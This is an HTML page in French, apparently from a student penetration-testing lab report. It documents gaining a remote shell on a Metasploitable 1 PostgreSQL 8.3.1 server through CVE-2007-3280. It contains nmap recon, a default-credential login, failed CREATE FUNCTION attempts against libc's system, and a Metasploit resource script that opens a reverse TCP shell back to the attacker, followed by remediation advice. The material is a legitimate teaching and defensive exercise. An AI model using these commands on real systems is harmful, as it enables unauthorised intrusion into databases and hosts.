@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PostgreSQL 8.3.1 — RCE via UDF — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">PostgreSQL 8.3.1 — RCE via bibliothèque UDF compilée</h1>
+    <h2 class="doc-subtitle">Deux tentatives manuelles réfutées avant de comprendre le vrai mécanisme : compilation d'une .so avec le bon magic block</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>PostgreSQL 8.3.1 — port <code class="mono">5432</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 1 — <code class="mono">192.168.56.102</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2007-3280">CVE-2007-3280</a></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Shell distant</strong> en tant que <code class="mono">postgres</code></td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <blockquote class="evidence">
+    <strong>Note réseau.</strong> Cette page utilise le réseau de Josaphat
+    (<code>vboxnet0</code>) : cible <code>192.168.56.102</code>, Kali <code>192.168.56.1</code>.
+    Côté Jules, le même service est sur <code>172.28.128.4</code>.
+  </blockquote>
+
+  <h2 class="section">1. Identification</h2>
+  <pre class="terminal">$ nmap -sC -sV -p 5432 192.168.56.102
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+
+$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "SELECT version(); SELECT usename, usesuper FROM pg_user WHERE usename='postgres';"
+PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+ usename  | usesuper
+----------+----------
+ postgres | t</pre>
+
+  <p><strong>PostgreSQL 8.3.1</strong>, identifiants par défaut <code>postgres:postgres</code>
+  fonctionnels, compte <strong>superuser</strong> — condition nécessaire pour la suite.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms1-postgresql/01-recon-auth.png" alt="Scan nmap et authentification postgres superuser">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc"><code>PostgreSQL DB 8.3.0 - 8.3.7</code> et <code>usesuper =
+      t</code> — identifiants par défaut valides, compte superuser.</span>
+      <span class="fname">images/ms1-postgresql/01-recon-auth.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p><strong>Tentative n°1 — <code>COPY ... TO PROGRAM</code> (ne s'applique pas).</strong></p>
+  <pre class="terminal">$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "COPY (SELECT 1) TO PROGRAM 'id';"
+ERROR:  syntax error at or near "PROGRAM"</pre>
+  <p><code>COPY ... TO PROGRAM</code> a été introduit en PostgreSQL <strong>9.3</strong> (2013).
+  La cible est en 8.3.1 (2008), largement antérieure.</p>
+
+  <p><strong>Tentative n°2 — fonction C depuis la libc (bloquée).</strong></p>
+  <pre class="terminal">$ PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;"
+ERROR:  incompatible library "/lib/libc.so.6": missing magic block
+ASTUCE : Extension libraries are required to use the PG_MODULE_MAGIC macro.</pre>
+  <p>PostgreSQL exige depuis la 8.2 que toute bibliothèque C chargée déclare un "magic block"
+  (<code>PG_MODULE_MAGIC</code>) — la libc brute n'a pas ce marqueur.</p>
+
+  <figure class="capture" id="cap-manuel">
+    <img src="../images/ms1-postgresql/02-tentatives-manuelles.png" alt="Deux tentatives manuelles échouées">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc"><code>syntax error at or near "PROGRAM"</code> et
+      <code>missing magic block</code> — deux échecs expliqués (version trop ancienne, puis
+      contre-mesure du serveur).</span>
+      <span class="fname">images/ms1-postgresql/02-tentatives-manuelles.png</span>
+    </figcaption>
+  </figure>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/linux/postgres/postgres_payload; exit"
+Description:
+  On some default Linux installations of PostgreSQL, the postgres
+  service account may write to the /tmp directory, and may source UDF
+  Shared Libraries from there as well, allowing execution of arbitrary code.
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-3280</pre>
+
+  <blockquote class="evidence">
+    <strong>Mécanisme réel.</strong> <strong>CVE-2007-3280</strong>. Le module ne charge pas une
+    lib système quelconque (ce qui expliquait les deux échecs précédents) : il
+    <strong>compile sa propre bibliothèque partagée</strong>, correctement marquée avec
+    <code>PG_MODULE_MAGIC</code> pour la version exacte du serveur cible, l'écrit dans
+    <code>/tmp</code> (accessible en écriture par le compte <code>postgres</code>) via les
+    fonctions de large objects, puis la charge comme fonction UDF pour exécuter le payload.
+  </blockquote>
+
+  <figure class="capture" id="cap-cve">
+    <img src="../images/ms1-postgresql/03-recherche-cve.png" alt="Description du module postgres_payload et CVE-2007-3280">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Mécanisme réel expliqué dans la <code>Description</code> du module :
+      écriture dans <code>/tmp</code> puis UDF — <strong>CVE-2007-3280</strong>.</span>
+      <span class="fname">images/ms1-postgresql/03-recherche-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <pre class="terminal">$ cat > /tmp/postgres.rc << 'EOF'
+use exploit/linux/postgres/postgres_payload
+set RHOSTS 192.168.56.102
+set USERNAME postgres
+set PASSWORD postgres
+set PAYLOAD linux/x86/shell/reverse_tcp
+set LHOST 192.168.56.1
+set LPORT 4447
+exploit -z
+EOF
+$ msfconsole -q -r /tmp/postgres.rc
+[*] 192.168.56.102:5432 - Uploaded as /tmp/wltnxZOA.so, should be cleaned up automatically
+[*] Sending stage (36 bytes) to 192.168.56.102
+[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.102:40931)</pre>
+
+  <p>La ligne <code>Uploaded as /tmp/wltnxZOA.so</code> confirme exactement le mécanisme lu
+  dans la description du module : une <code>.so</code> compilée à la volée, déposée dans
+  <code>/tmp</code>.</p>
+
+  <figure class="capture" id="cap-exploit">
+    <img src="../images/ms1-postgresql/04-exploit-msf.png" alt="Upload de la .so et ouverture de session">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc"><code>Uploaded as /tmp/wltnxZOA.so</code> puis
+      <code>Command shell session 1 opened</code>.</span>
+      <span class="fname">images/ms1-postgresql/04-exploit-msf.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <pre class="terminal">sessions -i 1 -c id
+uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)</pre>
+
+  <p>Shell confirmé en tant que <strong><code>postgres</code></strong>. Pas root : l'élévation
+  de privilèges sera une étape distincte.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms1-postgresql/05-session-proof.png" alt="Preuve d'accès uid=108 postgres">
+    <figcaption>
+      <strong class="idx">5.</strong>
+      <span class="desc"><code>uid=108(postgres)</code> — accès confirmé sur la cible.</span>
+      <span class="fname">images/ms1-postgresql/05-session-proof.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Changer le mot de passe par défaut (<code>postgres:postgres</code>) — cause racine de
+      l'accès initial.</li>
+      <li>Mettre à jour PostgreSQL : la 8.3.1 (2008) est très obsolète.</li>
+      <li>Restreindre les droits du compte système <code>postgres</code> : il ne devrait pas
+      pouvoir écrire dans des répertoires partagés comme <code>/tmp</code> qui servent ensuite
+      de point de chargement pour des bibliothèques UDF arbitraires (cœur de
+      CVE-2007-3280).</li>
+      <li>Restreindre l'accès réseau à PostgreSQL (<code>pg_hba.conf</code>, pare-feu).</li>
+      <li>Révoquer le statut superuser des comptes applicatifs dès que possible.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms1/josa/postgresql.md"><code>ms1/josa/postgresql.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2007-3280 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2007-3280">nvd.nist.gov/vuln/detail/CVE-2007-3280</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — POSTGRESQL 8.3.1 RCE (UDF)</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
